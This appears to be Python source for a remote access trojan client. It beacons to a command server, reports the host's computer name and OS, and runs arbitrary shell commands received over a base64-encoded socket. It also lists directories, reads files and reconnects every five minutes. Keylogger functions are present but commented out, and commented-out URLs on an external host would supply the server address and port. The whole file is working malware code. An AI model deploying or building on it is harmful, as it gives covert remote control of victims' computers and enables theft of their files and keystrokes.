#---- INSTALLED SCRIPTS ----#
import socket, os, subprocess, pathlib, platform, logging, base64, time
from threading import Thread
from pynput.keyboard import Key, Listener

#---- USER SCRIPTS ----#
#import keylogClient, findIP

received = b''
currentPath = os.getcwd()

#---- CLIENT SETTINGS ----#
waitInLoop = 5 # How many minutes to wait before retrying connection

#---- SERVER SETTINGS ----#
#If no url is defined(empty string), it will default to default port
portUrl = "" #"http://galacticdiversion.x10host.com/port"
defPort = 1337

#If no url is defined(empty string), it will default to given ip
url = "" #"http://galacticdiversion.x10host.com/ip"
ip = 'localhost'

quitting = False

def checkCom(command):
	global received
	if received[0:len(command) + 1].lower() == (command + " ").lower():
		received = received[len(command) + 1:]
		return True
	elif received[0:len(command)].lower() == command.lower() and len(received) == len(command):
		received = ''
		return True
	else:
		return False

def runShell(command):
	logging.info("Running Command: " + command)
	proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc2.stdout.read() + proc2.stderr.read()
	return stdout_value

def receive():
	global received, currentPath, quitting

	received = base64.decodebytes(s.recv(1024)).decode('utf8')
	
	if checkCom('exit'):
		quitting = True
		s.close()

	elif checkCom('quit'):
		s.close()

	elif checkCom('shell'):
		if received:
			proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_value = proc2.stdout.read() + proc2.stderr.read()
			args = stdout_value
		else:
			args = "No Command Provided"

	elif checkCom('shellThread'):
		if received:
			process = Thread(target=runShell, args=[received])
			process.start()
			process.join()
			args = 'Ran Command'
		else:
			args = "No Command Provided"

	elif checkCom('cwd'):
		args = currentPath

	elif checkCom('ls'):
		currentPath = os.getcwd()
		currentDirectory = pathlib.Path(currentPath)
		files = []
		files.append('<DIR> .')
		files.append('<DIR> ..')
		for file in currentDirectory.iterdir():
			fileName = str(file).split('\\')[-1]
			if os.path.isdir(str(file)):
				files.append('<DIR> ' + fileName)
			else:
				files.append('      ' + fileName)
		args = '\n'.join(files)

	elif checkCom('cd'):
		if os.path.isdir(received):
			os.chdir(received)
			currentPath = os.getcwd()
			args = 'currentPath:' + currentPath
		elif received == '~':
			os.chdir(os.path.expanduser('~'))
			currentPath = os.getcwd()
			args = 'currentPath:' + currentPath
		else:
			args = '"' + received + '" Is not a Directory'

	elif checkCom('cat'):
		f = open(received)
		args = f.read()
		f.close()

	# elif checkCom('keylog'):
	# 	if received and not keylogClient.keylogRunning:
	# 		process = Thread(target=keylogClient.start, args=[int(received), host])
	# 		process.daemon = True
	# 		process.start()
	# 		#process.join()
	# 		args = 'Starting Keylogger'
	# 	elif keylogClient.keylogRunning and received:
	# 		args = 'Keylogger Already Running'
	# 	else:
	# 		args = 'Provide Valid Port'


	# elif checkCom('killkeylog'):
	# 	if keylogClient.keylogRunning:
	# 		keylogClient.kill()
	# 		args = 'Killing Keylogger'
	# 	else:
	# 		args = 'Keylogger Not Running'

	else:
		args = 'Command: "' + received + '" Is Not Recognised'

	send(args)

def send(args):
	global received
	if type(args) == type(''):
		send = args.encode('utf8')
	elif type(args) == type(b''):
		send = args
	else:
		send = str(args).encode('utf8')

	send = base64.encodebytes(send)

	s.send(send)
	received = b''
	receive()

def connect():
	notConnected = True
	while notConnected:
		global host, port, s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			# print('[!] Trying To Connect To %s:%s'%(host, port))
			s.connect((host,port))
			# print('[*] Connection Established')
			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
			notConnected = False

		except Exception as e:
			print('Could Not Connect: ', e)

def connectToManager():
	notConnected = True
	while notConnected:
		global host, port
		port = int(port)

		mS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			mS.connect((host,port))
			

			mS.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))

			port = int(mS.recv(1024).decode())
			print("Recieved Port:", port)
			notConnected = False

		except Exception as e:
			print('Could Not Connect To Manager: ', e)

def reset():
	global received, currentPath, host, url, ip, port, portUrl, defPort
	print("Resetting")
	#keylogClient.kill()
	received = b''
	currentPath = os.getcwd()
	# host = findIP.getIP(url, ip)
	# port = findIP.getIP(portUrl, defPort)
	host = ip
	port = defPort


while not quitting:
	reset()
	# print("Starting Client")
	try:
		connectToManager()
		connect()
		receive()
		s.close()
	except Exception as e:
		print("Cut Out Of Loop: ")


	if not quitting:
		time.sleep(waitInLoop * 60)